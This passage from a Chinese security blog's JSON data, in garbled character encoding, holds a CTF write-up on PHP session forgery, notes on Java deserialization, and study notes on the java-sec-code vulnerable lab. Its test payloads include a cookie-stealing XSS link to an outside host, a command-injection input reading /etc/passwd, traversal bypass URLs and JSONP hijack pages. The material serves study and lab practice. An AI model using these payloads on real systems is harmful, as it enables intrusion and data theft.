if(preg_match('/(\\.\\.\\/|\\.\\.\\\\\\\\)/', $file_path))&#123; throw new RuntimeException('invalid file path'); &#125; //dir_pathåˆ›å»ºç›®å½•ï¼Œå°†ä¸´æ—¶æ–‡ä»¶ç§»åŠ¨åˆ°è¯¥ç›®å½•ä¸‹ @mkdir($dir_path, 0700, TRUE); if(move_uploaded_file($_FILES['up_file']['tmp_name'],$file_path))&#123; $upload_result = \"uploaded\"; &#125;else&#123; throw new RuntimeException('error while saving'); &#125; &#125; catch (RuntimeException $e) &#123; $upload_result = $e-&gt;getMessage(); &#125;//ä¸‹è½½æ–‡ä»¶&#125; elseif ($direction === \"download\") &#123; try&#123; //è¿”å›è·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ† $filename = basename(filter_input(INPUT_POST, 'filename')); //file_pathæ‹¼æ¥ä¸Šæ–‡ä»¶å $file_path = $dir_path.\"/\".$filename; //å¯¹ä¸‹è½½è·¯å¾„è¿›è¡Œæ­£åˆ™åŒ¹é…è¿‡æ»¤../å’Œ..\\\\ if(preg_match('/(\\.\\.\\/|\\.\\.\\\\\\\\)/', $file_path))&#123; throw new RuntimeException('invalid file path'); &#125; //åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨ if(!file_exists($file_path)) &#123; throw new RuntimeException('file not exist'); &#125; //è®¾ç½®è¿”å›å¤´ï¼Œè¿™ä¸ªsubstr($filename, 0, -65)æŒºå¥‡æ€ªçš„ï¼Œå¦‚æœfilenameçš„é•¿åº¦å°äº65ä¼šè¿”å›falseï¼Œè¿”å›çš„filename=\"\" header('Content-Type: application/force-download'); header('Content-Length: '.filesize($file_path)); header('Content-Disposition: attachment; filename=\"'.substr($filename, 0, -65).'\"'); //è¯»å–æ–‡ä»¶ if(readfile($file_path))&#123; $download_result = \"downloaded\"; &#125;else&#123; throw new RuntimeException('error while saving'); &#125; &#125; catch (RuntimeException $e) &#123; $download_result = $e-&gt;getMessage(); &#125; exit;&#125;?&gt; çœ‹å®Œæºç åæ€è·¯ ä¸€ã€ä¸Šä¼ sessionæ ¼å¼çš„æ–‡ä»¶ï¼Œä¿®æ”¹Cookieä¸­çš„PHPSESSIDä»è€Œä¼ªé€ èº«ä»½ï¼Œæ–‡ä»¶å†…å®¹ï¼Œé»˜è®¤çš„sessionå¤„ç†å™¨å¾—åˆ°çš„å†…å®¹ä¸ºusername|s:5:&quot;admin&quot;;ã€‚ä¸»è¦åˆ©ç”¨çš„æ˜¯ç›¸åŒçš„æ–‡ä»¶å†…å®¹å¯¹åº”çš„æ–‡ä»¶åç›¸åŒã€‚ äºŒã€æˆåŠŸä¼ªé€ adminåï¼Œè¿˜éœ€è¦åˆ›å»ºä¸€ä¸ª/var/babyctf/success.txtï¼Œå¯ä»¥é€šè¿‡POSTä¼ atträ¸ºsuccess.txtåˆ›å»ºç›®å½•ç»•è¿‡file_exist() ç„¶åæœ‰ä¸ªå°å‘ï¼Œè¯»å–ä¸‹sessionæ–‡ä»¶ï¼Œå‘ç°æ ¼å¼ä¸å¤ªä¸€æ ·ã€‚ã€‚å¼ºè¡Œç”¨ä¸€ä¸‹downloadåŠŸèƒ½ã€‚ã€‚ éœ€è¦æœ€å‰é¢åŠ ä¸ª%08å­—ç¬¦ï¼Œä»¥åŠæ²¡æœ‰|ï¼Œå…¶å®å°±æ˜¯å°†sessionå¤„ç†å™¨è®¾ç½®ä¸º php_binary","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"javaååºåˆ—åŒ–åŸç†","slug":"javaååºåˆ—åŒ–åŸç†","date":"2020-04-18T01:40:04.000Z","updated":"2020-04-20T02:58:57.124Z","comments":true,"path":"2020/04/18/javaååºåˆ—åŒ–åŸç†/","link":"","permalink":"https://glotozz.github.io/2020/04/18/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• ä¸ºä»€ä¹ˆè¦åºåˆ—åŒ–æ•°æ® åºåˆ—åŒ–è¿‡ç¨‹ ååºåˆ—åŒ–è¿‡ç¨‹ ååºåˆ—åŒ–æ¼æ´ä¿®å¤ ååºåˆ—åŒ–æ¼æ´è§¦å‘åœºæ™¯ ååºåˆ—åŒ–æ¼æ´æŒ–æ˜ å‚è€ƒé“¾æ¥ javaä½“ç³»å¾ˆå¤§ï¼Œè‡ªå·±åˆšå…¥é—¨ï¼Œåˆ†æä¸€äº›å†å²æ¼æ´çš„æ—¶å€™å‘ç°å¾ˆå¤šçŸ¥è¯†ç‚¹è”ç³»ä¸åˆ°ä¸€èµ·ï¼Œå› æ­¤å‚è€ƒä¸€äº›æ–‡ç« å’Œè‡ªå·±çš„ç†è§£å†™ä¸€ç¯‡ç®€å•çš„æ€»ç»“ã€‚ ä¸ºä»€ä¹ˆè¦åºåˆ—åŒ–æ•°æ®JSONå’ŒXMLæ˜¯é€šç”¨æ•°æ®äº¤äº’æ ¼å¼ï¼Œé€šå¸¸ç”¨äºä¸åŒè¯­è¨€ã€ä¸åŒç¯å¢ƒä¸‹æ•°æ®çš„äº¤äº’ï¼Œæ¯”å¦‚å‰ç«¯çš„JavaScripté€šè¿‡JSONå’Œåç«¯æœåŠ¡é€šä¿¡ã€å¾®ä¿¡æœåŠ¡å™¨é€šè¿‡XMLå’Œå…¬ä¼—å·æœåŠ¡å™¨é€šä¿¡ã€‚ä½†æ˜¯è¿™ä¸¤ç§è¯­è¨€æ— æ³•ç›´æ¥ä¼ è¾“å¯¹è±¡ï¼Œæ¯”å¦‚ï¼ŒJacksonå’ŒFastjsonè¿™ç±»åºåˆ—åŒ–åº“ï¼Œåœ¨JSONï¼ˆXMLï¼‰çš„åŸºç¡€ä¸Šè¿›è¡Œæ”¹é€ ï¼Œé€šè¿‡ç‰¹å®šçš„è¯­æ³•æ¥ä¼ é€’å¯¹è±¡ï¼›äº¦æˆ–è€…å¦‚RMIï¼Œç›´æ¥ä½¿ç”¨Javaç­‰è¯­è¨€å†…ç½®çš„åºåˆ—åŒ–æ–¹æ³•ï¼Œå°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢æˆä¸€ä¸²äºŒè¿›åˆ¶æ•°æ®è¿›è¡Œä¼ è¾“ã€‚ åºåˆ—åŒ–è¿‡ç¨‹Test1.java 123456789101112131415161718192021222324252627282930313233343536import java.io.*;public class Test1 implements Serializable &#123; private static final long serialVersionUID = 5754104541168322017L; private int id; public String name; public Test1(int id,String name)&#123; this.id=id; this.name=name; &#125;// private void writeObject(java.io.ObjectOutputStream s) throws IOException &#123;// s.defaultWriteObject();// s.writeObject(\"This is a object\");// &#125;// private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException &#123;// in.defaultReadObject();// Runtime.getRuntime().exec(\"calc\");// &#125; public static void main(String[] args) throws Exception&#123; Test1 test1 = new Test1(1,\"gqy\"); //åºåˆ—åŒ– File f = new File(\"test1.ser\"); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f)); out.writeObject(test1); out.close(); //ååºåˆ—åŒ– FileInputStream fis = new FileInputStream(\"test1.ser\"); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); ois.close(); &#125;&#125; 16è¿›åˆ¶æŸ¥çœ‹ SerializationDumperæŸ¥çœ‹åºåˆ—åŒ–æ•°æ® å¯ä»¥çœ‹åˆ°ClassNameã€Fieldsã€classdataè¿˜æ˜¯å¾ˆæ¸…æ¥šçš„ï¼Œå¦å¤–çš„ä¸€äº›å¯ä»¥çœ‹å®˜æ–¹æ–‡æ¡£ Javaåœ¨åºåˆ—åŒ–æ—¶ä¸€ä¸ªå¯¹è±¡ï¼Œå°†ä¼šè°ƒç”¨è¿™ä¸ªå¯¹è±¡ä¸­çš„ writeObject() æ–¹æ³•ï¼Œå‚æ•°ç±»å‹æ˜¯ObjectOutputStream ï¼Œå¼€å‘è€…å¯ä»¥å°†ä»»ä½•å†…å®¹å†™å…¥è¿™ä¸ªstreamä¸­ã€‚ å¦‚æœä¸Šé¢Test1.javaé‡å†™writeObject()ï¼ˆå‚è€ƒTest1.javaä¸­çš„æ³¨é‡Šï¼‰ï¼Œåºåˆ—åŒ–çš„æ•°æ®æ˜¯è¿™æ ·çš„ï¼Œå‘ç°å¤šäº†objectAnnotation ååºåˆ—åŒ–è¿‡ç¨‹ååºåˆ—åŒ–æ—¶ï¼Œä¼šè°ƒç”¨readObject() ï¼Œå¼€å‘è€…ä¹Ÿå¯ä»¥ä»ä¸­è¯»å–å‡ºå‰é¢å†™å…¥çš„å†…å®¹ï¼Œå¹¶è¿›è¡Œå¤„ç†ã€‚ åœ¨å‘½ä»¤æ‰§è¡Œå¤„æ‰“ä¸ªæ–­ç‚¹ æ ¹æ®è°ƒç”¨æ ˆå¯ä»¥æ¸…æ¥šçš„ä¸‹æ–­ç‚¹ï¼ˆä¸€å¼€å§‹ç”¨çš„java1.8ç¯å¢ƒï¼Œå»ºè®®æ¢ç”¨java1.7ï¼Œä»£ç å¯è¯»æ€§æ›´é«˜ï¼‰ è·Ÿè¿›readObject0() è¿™é‡Œè¯»å–çš„tcå…¶å®å°±æ˜¯åºåˆ—åŒ–æ•°æ®ä¸­çš„TC_OBJECT è·Ÿè¿›readOrdinaryObject() 12345678910111213141516171819202122232425262728293031private Object readOrdinaryObject(boolean unshared) throws IOException &#123; if (bin.readByte() != TC_OBJECT) &#123; throw new InternalError(); &#125; // è¯»å–åºåˆ—åŒ–ä¸­çš„ObjectStreamClass ObjectStreamClass desc = readClassDesc(false); ... // é€šè¿‡åå°„ï¼Œåˆ›å»ºå¯¹è±¡ Object obj; try &#123; obj = desc.isInstantiable() ? desc.newInstance() : null; &#125; catch (Exception ex) &#123; ... &#125; // åˆ¤æ–­æ˜¯å¦å®ç°äº†Externalizableæ¥å£ï¼Œå¦‚æœå®ç°äº†æ¥å£ï¼Œä½¿ç”¨è¿™ä¸ªæ¥å£æ¥ç»™å±æ€§èµ‹å€¼ if (desc.isExternalizable()) &#123; readExternalData((Externalizable) obj, desc); &#125; // æˆ‘ä»¬å¹¶æ²¡æœ‰å®ç°Externalizableæ¥å£ï¼Œä¼šè¿›å…¥åˆ°elseåˆ¤æ–­ else &#123; // è¯»å–åºåˆ—åŒ–çš„æ•°æ® readSerialData(obj, desc); &#125; // åˆ¤æ–­æ˜¯å¦è‡ªå®šä¹‰äº†readObjectæ–¹æ³•ï¼Œå¦‚æœæœ‰ä¼šè°ƒç”¨ï¼Œå¦‚æœæ²¡æœ‰ç›´æ¥è¿”å›obj // æ­¤å¤„çœç•¥ ... return obj; &#125; ä¸Šé¢æ–¹æ³•æ˜¯ååºåˆ—åŒ–çš„å…¨éƒ¨æµç¨‹ï¼Œé‡ç‚¹çœ‹ä¸€ä¸‹è¯»å–ObjectStreamClassçš„readClassDesc()æ–¹æ³•å’Œè¯»å–åºåˆ—åŒ–æ•°æ®çš„readSerialData()æ–¹æ³•ã€‚ è·Ÿè¿›readClassDesc() è¿™é‡Œå¯¹åº”çš„æ˜¯TC_CLASSDESCä¸­çš„å†…å®¹ æ³¨æ„åˆ°caseè¿˜æœ‰ä¸ª TC_PROXYCLASSDESCæ˜¯ ä»£ç†ç±»æè¿°ç¬¦ï¼Œä¸ååºåˆ—åŒ–æ¼æ´ä¿®å¤ç›¸å…³ï¼Œä¹‹åä»‹ç»ã€‚ å…ˆè·Ÿè¿›readNonProxyDesc() 1234567891011121314151617181920212223242526private ObjectStreamClass readNonProxyDesc(boolean unshared) throws IOException &#123; ... // åˆ›å»ºObjectStreamClass ObjectStreamClass desc = new ObjectStreamClass(); // è¯»å–ObjectStreamClass ObjectStreamClass readDesc = null; try &#123; readDesc = readClassDescriptor(); &#125; catch (ClassNotFoundException ex) &#123; throw (IOException) new InvalidClassException( \"failed to read class descriptor\").initCause(ex); &#125; ... // é€šè¿‡è°ƒç”¨resolveClass()è·å–ç±»åï¼Œè·Ÿè¿›æ˜¯é€šè¿‡Class.forName(name, false, latestUserDefinedLoader())åå°„è·å–ç±»å try &#123; if ((cl = resolveClass(readDesc)) == null) &#123; resolveEx = new ClassNotFoundException(\"null class\"); ... // é€šè¿‡è¯»å–åˆ°ObjectStreamClassåˆå§‹åŒ–desc desc.initNonProxy(readDesc, cl, resolveEx, readClassDesc(false)); ... // è¿”å›desc return desc; &#125; è·Ÿè¿›readClassDescriptor()=&gt;readNonProxy()ï¼Œåˆå§‹åŒ–å±æ€§ è·Ÿè¿›initNonProxy()ï¼Œä¸»è¦æ˜¯ä¸€äº›åˆ¤æ–­ï¼Œæ¯”å¦‚serialVersionUIDæ˜¯å¦ç›¸ç­‰ï¼Œå¦åˆ™æŠ›å‡ºå¼‚å¸¸ å‰é¢å·²ç»åˆå§‹åŒ–äº†å±æ€§ï¼Œè·Ÿè¿›readSerialData()ï¼Œä¼šè¯»å–å¹¶å°†å±æ€§èµ‹å€¼ ååºåˆ—åŒ–æ¼æ´ä¿®å¤å‰é¢æåˆ°TC_PROXYCLASSDESCæ˜¯ ä»£ç†ç±»æè¿°ç¬¦ï¼Œä¸ååºåˆ—åŒ–æ¼æ´ä¿®å¤ç›¸å…³ã€‚å…¶å®è¯´æ³•ä¸å‡†ç¡®ï¼Œåº”è¯¥è¯´æ˜¯é’ˆå¯¹ resolveProxyClass å’Œ resolveClass()æ–¹æ³•ï¼Œå› ä¸ºçŸ¥é“æ˜¯é€šè¿‡ä¸Šé¢ä¸¤ä¸ªæ–¹æ³•è·å–ç±»åï¼Œå› æ­¤å¯ä»¥é€šè¿‡é‡å†™è¿™ä¸¤ä¸ªæ–¹æ³•è®¾ç½®é»‘åå•æŠ›å‡ºå¼‚å¸¸ã€‚ æ¯”å¦‚ ååºåˆ—åŒ–æ¼æ´è§¦å‘åœºæ™¯åœ¨javaç¼–å†™çš„webåº”ç”¨ä¸webæœåŠ¡å™¨é—´javaé€šå¸¸ä¼šå‘é€å¤§é‡çš„åºåˆ—åŒ–å¯¹è±¡ä¾‹å¦‚ä»¥ä¸‹åœºæ™¯ï¼š HTTPè¯·æ±‚ä¸­çš„å‚æ•°ï¼Œcookiesä»¥åŠParametersã€‚ RMIåè®®ï¼Œè¢«å¹¿æ³›ä½¿ç”¨çš„RMIåè®®å®Œå…¨åŸºäºåºåˆ—åŒ– JMXåŒæ ·ç”¨äºå¤„ç†åºåˆ—åŒ–å¯¹è±¡ è‡ªå®šä¹‰åè®® ç”¨æ¥æ¥æ”¶ä¸å‘é€åŸå§‹çš„javaå¯¹è±¡ ä¸ªäººè§‰å¾—æ¯”è¾ƒå¸¸è§çš„æ˜¯1ã€2 ååºåˆ—åŒ–æ¼æ´æŒ–æ˜ ååºåˆ—åŒ–è§¦å‘ç‚¹ ä¸€ã€å¸¸è§ååºåˆ—åŒ–æ“ä½œæ–¹æ³• 1234567ObjectInputStream.readObjectObjectInputStream.readUnsharedXMLDecoder.readObjectYaml.loadXStream.fromXMLObjectMapper.readValueJSON.parseObject gadget chain ä¸€ã€ å®ç° Serializable æˆ– Externalizableï¼Œ ä¸»è¦çœ‹ readObject() å’Œ readExternal() äºŒã€XStreamã€JSONç›¸å…³çš„åºåˆ—åŒ–å·¥å…·ç­‰ï¼Œä¸ç”¨å®ç°ä¸Šé¢æåˆ°çš„ä¸¤ä¸ªæ¥å£ä¹Ÿå¯ä»¥å®ç°ç±»çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ã€‚ å¸¸è§å¯åˆ©ç”¨çš„ç¬¬ä¸‰æ–¹åº“ 1234567891011commons-fileupload 1.3.1commons-io 2.4commons-collections 3.1commons-logging 1.2commons-beanutils 1.9.2org.slf4j:slf4j-api 1.7.21com.mchange:mchange-commons-java 0.2.11org.apache.commons:commons-collections 4.0com.mchange:c3p0 0.9.5.2org.beanshell:bsh 2.0b5org.codehaus.groovy:groovy 2.3.9 å‚è€ƒé“¾æ¥ https://govuln.com/ http://www.lmxspace.com/ https://www.cnblogs.com/studyskill/p/9207117.html","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://glotozz.github.io/tags/java/"}]},{"title":"Java Sec Codeå­¦ä¹ ç¬”è®°","slug":"Java-Sec-Codeå­¦ä¹ ç¬”è®°","date":"2020-04-15T13:11:31.000Z","updated":"2020-04-17T10:39:31.177Z","comments":true,"path":"2020/04/15/Java-Sec-Codeå­¦ä¹ ç¬”è®°/","link":"","permalink":"https://glotozz.github.io/2020/04/15/Java-Sec-Code%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• ç¯å¢ƒæ­å»º é¢„å¤‡çŸ¥è¯† SQLI XSS æ–‡ä»¶ä¸Šä¼ æ¼æ´ SSTI JSONPåŠ«æŒ CommandInject ååºåˆ—åŒ–æ¼æ´ FastJsonæ¼æ´ è·¯å¾„ç©¿è¶Šæ¼æ´ GetRequestURI IPä¼ªé€  SpEL XStreamRce URLé‡å®šå‘ SSRF XXE æ€»ç»“ ä¹‹å‰ä¸»è¦æ˜¯åˆ†æä¸€äº›javaä¸­å½±å“è¾ƒå¤§çš„å†å²æ¼æ´ï¼Œå¤§å¤šéƒ½æ˜¯æ¡†æ¶å±‚é¢çš„æ¼æ´ï¼Œå‰ä¸¤å¤©çœ‹åˆ°JoyChouå¸ˆå‚…githubä¸Šçš„é¡¹ç›®ï¼Œæ˜¯ä¸€ä¸ªjavaæ¼æ´ä»£ç çš„é¶åœºï¼ŒåŒ…æ‹¬å¸¸è§æ¼æ´ä»£ç å’Œå®‰å…¨ä»£ç ï¼Œå€¼å¾—ç»†å“ã€‚ ç¯å¢ƒæ­å»ºhttps://github.com/JoyChou93/java-sec-code/blob/master/README_zh.md è¯¥é¡¹ç›®æ˜¯åŸºäºspringæ¡†æ¶å¼€å‘ï¼Œæˆ‘æ­å»ºçš„æ–¹å¼é€‰æ‹©ideaæ­å»ºã€‚ é¢„å¤‡çŸ¥è¯†åœ¨æ­£å¼å¼€å§‹å­¦ä¹ è¿™ä¸ªé¡¹ç›®ä¹‹å‰å¯ä»¥å…ˆç®€å•å­¦ä¹ ä¸‹springæ¡†æ¶ã€‚ è™½ç„¶æ²¡ç”¨è¿‡springæ¡†æ¶ï¼Œä½†æ˜¯å¤§è‡´èƒ½çœ‹æ‡‚ï¼Œå…ˆåˆ†æå‡ ä¸ªå¸¸è§„çš„æ–‡ä»¶ã€‚ Login.java Index.java SQLIæ¼æ´ä»£ç  ç›´æ¥å°†ç”¨æˆ·ä¼ å…¥çš„usernameæ‹¼æ¥å…¥sqlè¯­å¥ æ¼æ´æµ‹è¯• å®‰å…¨ä»£ç  é‡‡ç”¨é¢„ç¼–è¯‘çš„å½¢å¼å¯ä»¥é˜²æ­¢sqlæ³¨å…¥ XSSæ¼æ´ä»£ç  åå°„å‹xss å¯¹äºç”¨æˆ·è¾“å…¥çš„å‚æ•°æ²¡æœ‰è¿‡æ»¤ç›´æ¥è¿”å›ç»™å‰ç«¯ï¼Œå¯¼è‡´åå°„æ€§xssï¼Œå¯ä»¥é€šè¿‡æ„é€ æ¶æ„é“¾æ¥è¯±å¯¼ç”¨æˆ·è®¿é—®ï¼Œä»è€Œè·å–cookieç­‰æ‰©å¤§å±å®³ã€‚ å­˜å‚¨å‹xss å¯¹äºç”¨æˆ·è¾“å…¥çš„å‚æ•°æ²¡æœ‰è¿‡æ»¤ç›´æ¥ä¿å­˜åˆ°cookieä¸­ï¼Œè¯»å–çš„æ—¶å€™ä¹Ÿæ²¡æœ‰ç»è¿‡å¤„ç†å¯¼è‡´å‰ç«¯è§£æçš„æ—¶å€™å¯¼è‡´xss æ¼æ´æµ‹è¯• æ¶æ„é“¾æ¥ 1http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;xss&#x2F;reflect?xss&#x3D;%3CsCRiPt%20sRC&#x3D;&#x2F;&#x2F;xss.pt&#x2F;uJSf%3E%3C&#x2F;sCrIpT%3E æµ‹è¯•äº†ä¸€ä¸‹ï¼Œèƒ½æ¥æ”¶åˆ°è¯·æ±‚ï¼Œä½†æ˜¯è¯»ä¸åˆ°cookieï¼ŒæŸ¥çœ‹cookieå‘ç°è®¾ç½®äº†httponly å®‰å…¨ä»£ç  å°†ä¸€äº›ç‰¹æ®Šå­—ç¬¦htmlå®ä½“ç¼–ç é˜²æ­¢xss æ–‡ä»¶ä¸Šä¼ æ¼æ´æ²¡æœ‰æä¾›æ¼æ´ä»£ç ï¼Œä½†æ˜¯å¯ä»¥å‚è€ƒä¸Šä¼ å›¾ç‰‡åŠŸèƒ½çš„æ£€æŸ¥ä¸¾ä¸€åä¸‰ã€‚ å®‰å…¨ä»£ç  ä¸¤ä¸ªå‡½æ•° convert()å…ˆå†™å…¥ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ï¼Œä¸ºä¹‹åçš„å†…å®¹æ£€æŸ¥åšå‡†å¤‡ï¼ŒisImage()åˆ¤æ–­æ˜¯å¦æ˜¯å›¾ç‰‡æ ¼å¼ è·å–ä¸€äº›æ–‡ä»¶å±æ€§ åç¼€åæ£€æŸ¥ MIMEç±»å‹æ£€æŸ¥ï¼ˆä¸ªäººè®¤ä¸ºMIMEçš„æ„ä¹‰ä¸å¤§ï¼‰ å›¾ç‰‡å†…å®¹æ£€æŸ¥ æœ€åä¸Šä¼ æ–‡ä»¶åå°†ä¸´æ—¶æ–‡ä»¶åˆ é™¤ã€‚ SSTIæ¼æ´ä»£ç  æ¼æ´æµ‹è¯• å®‰å…¨ä»£ç  velocity.evaluate()æœ€æ–°ç‰ˆæœ¬ä»å­˜åœ¨sstiï¼Œé¿å…ä½¿ç”¨velocity.evaluate()æ–¹æ³• JSONPåŠ«æŒç”¨jsonæ¥ä¼ æ•°æ®ï¼Œé jsonpæ¥è·¨åŸŸ æ¼æ´åŸç† æ¼æ´ä»£ç  è¿”å›jsonpæ ¼å¼ï¼Œæ³¨æ„è¿™é‡Œçš„this.callback=_callbackï¼Œå½“ç„¶è¿™ä¸ªä¾‹å­å³ä½¿paramä¼ é”™ä¹Ÿèƒ½è·å–åˆ°æ•°æ® è¿”å›jsonpæ ¼å¼ï¼Œæ²¡æœ‰å¤„ç†refererä¸ºç©ºçš„æƒ…å†µï¼Œå¹¶ä¸”ç©ºrefereræ˜¯å¯ä»¥è¢«ç»•è¿‡çš„ è¿”å›Object(æ¯”å¦‚JSONObjectæˆ–è€…JavaBeanï¼Œä½†æ˜¯ä¸æ”¯æŒString)ï¼Œåªè¦åœ¨å‚æ•°ä¸­åŠ å…¥callback=testæˆ–cback=testå°±ä¼šè‡ªåŠ¨å˜æˆjsonpæ¥å£ã€‚ CVE-2018-11040: Spring MappingJackson2JsonViewï¼Œ è‡ªåŠ¨è·å–jsonpå’Œcallbackå‚æ•°ä½¿jsonæ•°æ®è‡ªåŠ¨è½¬æ¢æˆjsonpæ ¼å¼æ•°æ®ï¼Œæ”¯æŒè·¨åŸŸè¯·æ±‚ æ¼æ´æµ‹è¯• ä¸¤ç§æ–¹å¼ ajax 12345678910111213141516171819&lt;html&gt;&lt;head&gt;&lt;meta charset=\"UTF-8\" /&gt;&lt;script src=\"https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;script language=\"JavaScript\"&gt;$(document).ready(function() &#123; $.ajax(&#123; url:'http://192.168.56.1:8080/vuln/emptyReferer', dataType:'jsonp', success:function(data)&#123; alert(data.name) &#125; &#125;);&#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; &lt;script&gt; 123456789&lt;html&gt;&lt;script&gt; function test(data)&#123; alert(data.name); &#125;&lt;/script&gt;&lt;script src=http://localhost:8080/jsonp/referer?callback=test&gt;&lt;/script&gt;&lt;/html&gt; ç©ºrefererç»•è¿‡ (ä¸ºäº†æµ‹è¯•æ–¹ä¾¿ï¼ŒJSONPæ¥å£èƒ½ç›´æ¥è®¿é—®ï¼Œä¸ç›´æ¥è®¿é—®åšäº†Refereré™åˆ¶ã€‚æ­£å¸¸æ¥è®²ï¼Œå‰ç«¯å‘èµ·çš„è¯·æ±‚é»˜è®¤éƒ½ä¼šå¸¦ç€Referer) 12345678910&lt;html&gt;&lt;meta name=\"referrer\" content=\"no-referrer\" /&gt;&lt;script&gt; function test(data)&#123; alert(data.name); &#125;&lt;/script&gt;&lt;script src=http://localhost:8080/jsonp/emptyReferer?callback=test&gt;&lt;/script&gt;&lt;/html&gt; è¿™é‡Œmetaæ ‡ç­¾ä¸­åˆ é™¤äº†referer é¶åœºçš„æœ‰ç™»å½•è®¤è¯ï¼Œå› æ­¤å°±ä¸ç»§ç»­æµ‹è¯•äº† å®‰å…¨ä»£ç  refererä¸ºç©ºä¹Ÿè¿›è¡Œæ‹¦æˆª CommandInjectæ¼æ´ä»£ç  æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œå¤„ç†æ‹¼æ¥è¿›cmdListï¼Œå‘½ä»¤æ‰§è¡Œ å’Œä¸Šé¢çš„ç±»ä¼¼ æ¼æ´æµ‹è¯• 1host:127.0.0.1;cat &#x2F;etc&#x2F;passwd å®‰å…¨ä»£ç  å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œæ­£åˆ™åŒ¹é…ï¼Œé™åˆ¶äº†å­—ç¬¦é›†ã€‚ æˆ‘æ„Ÿè§‰è¿™ä¸ªæ­£åˆ™å°‘äº†ä¸€ä¸ª\\ï¼Œåº”è¯¥å¦‚ä¸‹ 1^[a-zA-Z0-9_\\&#x2F;\\\\.-]+$ ååºåˆ—åŒ–æ¼æ´æ¼æ´ä»£ç  ä»cookieè¯»å–rememberMeå­—æ®µå¯¹åº”çš„å€¼ï¼Œbase64è§£å¯†åè¿›è¡Œååºåˆ—åŒ–ï¼Œå­˜åœ¨ååºåˆ—åŒ–æ¼æ´ æ¼æ´æµ‹è¯• ä½¿ç”¨ysoserialç”ŸæˆCC5 å®‰å…¨ä»£ç  é¡¹ç›®ä¸­ç¼“è§£çš„å®ç°æ–¹æ³•æ˜¯å†™ä¸€ä¸ªObjectInputStreamçš„å­ç±»ï¼Œè¿™ä¸ªå­ç±»è¦é‡å†™resolveClass()ï¼Œå¯ä»¥é…ç½®ç™½åå•æˆ–è€…é»‘åå•ã€‚ Oracleæœ€è¿‘å¼•è¿›serialization filteringæ¥æé«˜ååºåˆ—åŒ–çš„å®‰å…¨æ€§ï¼Œå®ƒä¼¼ä¹ç»“åˆäº†é»‘åå•å’Œç™½åå•ä¸¤ç§æ–¹å¼ã€‚æ–°çš„ååºåˆ—åŒ–è¿‡æ»¤å™¨è¢«é›†æˆåœ¨JDK 9ä¹‹ä¸­ï¼Œè¿™ä¸ªç‰¹æ€§å·²ç»è¢«ç§»æ¤åˆ°æ›´è€çš„JDKä¹‹ä¸­äº†ã€‚æ ¸å¿ƒåŸç†æ˜¯ï¼Œååºåˆ—åŒ–è¿‡æ»¤åŸºäºObjectInputFilterï¼ˆ https://docs.oracle.com/javase/9/docs/api/java/io/ObjectInputFilter.html ï¼‰æ¥å£ï¼Œè¿™ä¸ªæ¥å£æä¾›ä¸€ç§é…ç½®èƒ½åŠ› FastJsonæ¼æ´æ¼æ´ä»£ç  ä»¥fastjson1.2.24ä¸ºä¾‹ï¼ŒparseObject()æ–¹æ³•è°ƒç”¨çš„æ—¶å€™åŠ ä¸ŠFeature.SupportNonPublicFieldä¸”payloadç”¨æˆ·å¯æ§ å®‰å…¨ä»£ç  å‡çº§fastjsonï¼Œé¿å…ä½¿ç”¨å±é™©é…ç½®å‚æ•° è·¯å¾„ç©¿è¶Šæ¼æ´æ¼æ´ä»£ç  æ²¡æœ‰å¯¹ä¼ å…¥çš„æ–‡ä»¶è·¯å¾„è¿›è¡Œæ£€æŸ¥ å®‰å…¨ä»£ç  å…ˆè¿›è¡Œurlè§£ç ï¼Œå†è®¾ç½®..å’Œ/é»‘åå•ï¼Œé˜²æ­¢è·¯å¾„ç©¿è¶Š GetRequestURIæ¼æ´ä»£ç  ä¸€äº›å¼€å‘äººå‘˜å¯¹é™æ€ç›®å½•ä¼šæ”¾è¡Œï¼Œæ£€æµ‹æ˜¯å¦åŒ…å«/css/å­—ç¬¦ä¸²ï¼Œä¸åŒ…å«æ‰æ ¡éªŒæƒé™ã€‚å¯ä»¥æƒé™ç»•è¿‡ æ¼æ´æµ‹è¯• 123http:&#x2F;&#x2F;localhost:8080&#x2F;css&#x2F;%2e%2e&#x2F;uri&#x2F;exclued&#x2F;vulnhttp:&#x2F;&#x2F;localhost:8080&#x2F;css&#x2F;..;&#x2F;uri&#x2F;exclued&#x2F;vulnhttp:&#x2F;&#x2F;localhost:8080&#x2F;css&#x2F;..;&#x2F;uri&#x2F;bypasswaf&#x2F;exclued&#x2F;vuln å®‰å…¨ä»£ç  å°†è·å–URIçš„æ–¹æ³•æ¢æˆrequest.getServletPath(); 12uri: &#x2F;css&#x2F;..&#x2F;hello serlvetPath: &#x2F;hellouri: &#x2F;css&#x2F;%2e%2e&#x2F;hello serlvetPath: &#x2F;hello IPä¼ªé€  ç”¨æˆ·å¯ä»¥ä¼ªé€ XFFå¤´ï¼Œå› æ­¤ipä¸èƒ½ä»X-Forwarded-Forè·å– SpELæ¼æ´ä»£ç  ä½¿ç”¨äº†SpelExpressionParser()æ–¹æ³•ï¼ŒSpELè§£æï¼Œä¸‹é¢æœ‰ä¸ªç›¸å…³çš„æ¼æ´ SpringBoot SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´ æ¼æ´æµ‹è¯• 